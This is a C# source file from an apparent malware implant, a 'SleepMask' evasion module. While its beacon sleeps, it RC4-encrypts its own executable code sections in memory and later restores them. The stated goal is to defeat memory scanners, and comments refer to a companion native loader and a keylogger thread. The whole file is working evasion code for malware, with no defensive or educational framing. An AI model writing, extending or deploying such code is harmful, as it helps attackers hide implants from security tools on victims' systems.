using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace S4M1A.Implant.Evasion
{
    // =====================================================================
    //  S4M1A SleepMask v2.0 - Ekko/Foliage style sleep obfuscation
    //  While the beacon sleeps, the main module's .text section is
    //  RC4-encrypted in memory with a per-sleep key, then decrypted and
    //  re-protected on wake. Mirrors the technique used by the native
    //  loader (src/Native/loader.c) for full-section masking.
    //
    //  LIMITATION: managed JIT code lives outside module .text, so this
    //  masks the PE image stored in memory (defeats static memory scans).
    //  The native loader path gives true code masking. Also: masking is
    //  only safe when auxiliary threads are quiescent - disable via
    //  Enabled=false if a background thread (e.g. keylogger) is active.
    // =====================================================================

    public static class SleepMask
    {
        public static bool Enabled = true;

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress,
            UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        private const uint PAGE_EXECUTE = 0x10;
        private const uint PAGE_READWRITE = 0x04;

        private static byte[] _key;
        private static IntPtr _textBase;
        private static int _textSize;
        private static uint _origProtect;

        public static void SleepProtected(int ms)
        {
            if (!Enabled || ms <= 0) { Thread.Sleep(ms); return; }

            List<Section> sections = GetExecutableSections();
            if (sections.Count == 0) { Thread.Sleep(ms); return; }

            _key = DeriveKey();
            _textBase = sections[0].Addr;
            _textSize = sections[0].Size;
            _origProtect = 0;

            try
            {
                Mask(sections);
                try
                {
                    Thread.Sleep(ms);
                }
                finally
                {
                    Unmask(sections);
                }
            }
            catch
            {
                Unmask(sections);
                Thread.Sleep(ms);
            }
            finally
            {
                Array.Clear(_key, 0, _key.Length);
                _key = null;
            }
        }

        // ------------------------- masking -------------------------

        private static void Mask(List<Section> sections)
        {
            RC4 rc4 = new RC4(_key);
            foreach (Section s in sections)
            {
                uint old;
                if (!VirtualProtect(s.Addr, (UIntPtr)s.Size, PAGE_READWRITE, out old))
                    continue;
                if (_origProtect == 0 && s.Addr == _textBase)
                    _origProtect = (old == 0) ? PAGE_EXECUTE : old;

                byte[] buf = new byte[s.Size];
                Marshal.Copy(s.Addr, buf, 0, s.Size);
                rc4.Crypt(buf);
                Marshal.Copy(buf, 0, s.Addr, buf.Length);
                Array.Clear(buf, 0, buf.Length);
            }
        }

        private static void Unmask(List<Section> sections)
        {
            if (_key == null) return;
            RC4 rc4 = new RC4(_key);
            foreach (Section s in sections)
            {
                try
                {
                    uint old;
                    VirtualProtect(s.Addr, (UIntPtr)s.Size, PAGE_READWRITE, out old);
                    byte[] buf = new byte[s.Size];
                    Marshal.Copy(s.Addr, buf, 0, s.Size);
                    rc4.Crypt(buf);
                    Marshal.Copy(buf, 0, s.Addr, buf.Length);
                    Array.Clear(buf, 0, buf.Length);
                    VirtualProtect(s.Addr, (UIntPtr)s.Size,
                        (s.Addr == _textBase && _origProtect != 0) ? _origProtect : PAGE_EXECUTE,
                        out old);
                }
                catch { }
            }
        }

        // ------------------------- section discovery -------------------------

        private class Section
        {
            public IntPtr Addr;
            public int Size;
        }

        private static List<Section> GetExecutableSections()
        {
            List<Section> result = new List<Section>();
            try
            {
                ProcessModule main = Process.GetCurrentProcess().MainModule;
                if (main == null) return result;
                IntPtr baseAddr = main.BaseAddress;

                byte[] head = ReadBytes(baseAddr, 0x1000);
                if (head.Length < 0x1000) return result;
                if (BitConverter.ToUInt16(head, 0) != 0x5A4D) return result;

                int e_lfanew = BitConverter.ToInt32(head, 0x3C);
                if (e_lfanew + 24 + 240 > head.Length) return result;
                if (BitConverter.ToUInt32(head, e_lfanew) != 0x00004550) return result;

                bool is64 = BitConverter.ToUInt16(head, e_lfanew + 4) == 0x20B;
                int sectionStart = e_lfanew + 24 + (is64 ? 240 : 224);
                int count = BitConverter.ToUInt16(head, e_lfanew + 6);
                if (count > 64) return result;

                for (int i = 0; i < count; i++)
                {
                    int off = sectionStart + i * 40;
                    if (off + 40 > head.Length) break;
                    string name = System.Text.Encoding.ASCII.GetString(head, off, 8).TrimEnd('\0');
                    uint vsize = BitConverter.ToUInt32(head, off + 8);
                    uint vaddr = BitConverter.ToUInt32(head, off + 12);
                    uint chars = BitConverter.ToUInt32(head, off + 36);
                    if ((chars & 0x20000000) != 0 && vsize > 0 && vsize < 0x400000)
                        result.Add(new Section { Addr = baseAddr + (int)vaddr, Size = (int)vsize });
                }
            }
            catch { }
            return result;
        }

        private static byte[] ReadBytes(IntPtr addr, int count)
        {
            byte[] b = new byte[count];
            try { Marshal.Copy(addr, b, 0, count); }
            catch { b = new byte[0]; }
            return b;
        }

        private static byte[] DeriveKey()
        {
            // per-sleep random key, mixed with tick time
            byte[] rnd = Crypto.RandomBytes(32);
            byte[] t = BitConverter.GetBytes(Stopwatch.GetTimestamp());
            byte[] seed = new byte[rnd.Length + t.Length];
            Buffer.BlockCopy(rnd, 0, seed, 0, rnd.Length);
            Buffer.BlockCopy(t, 0, seed, rnd.Length, t.Length);
            Array.Clear(rnd, 0, rnd.Length);
            return Crypto.Sha256(seed);
        }
    }

    // tiny RC4 implementation (self-contained, fast, no deps)
    internal sealed class RC4
    {
        private readonly byte[] _s = new byte[256];
        private int _i, _j;

        public RC4(byte[] key)
        {
            for (int i = 0; i < 256; i++) _s[i] = (byte)i;
            int j = 0;
            for (int i = 0; i < 256; i++)
            {
                j = (j + _s[i] + key[i % key.Length]) & 0xFF;
                Swap(i, j);
            }
        }

        public void Crypt(byte[] data)
        {
            for (int k = 0; k < data.Length; k++)
            {
                _i = (_i + 1) & 0xFF;
                _j = (_j + _s[_i]) & 0xFF;
                Swap(_i, _j);
                data[k] ^= _s[(_s[_i] + _s[_j]) & 0xFF];
            }
        }

        private void Swap(int a, int b)
        {
            byte t = _s[a]; _s[a] = _s[b]; _s[b] = t;
        }
    }
}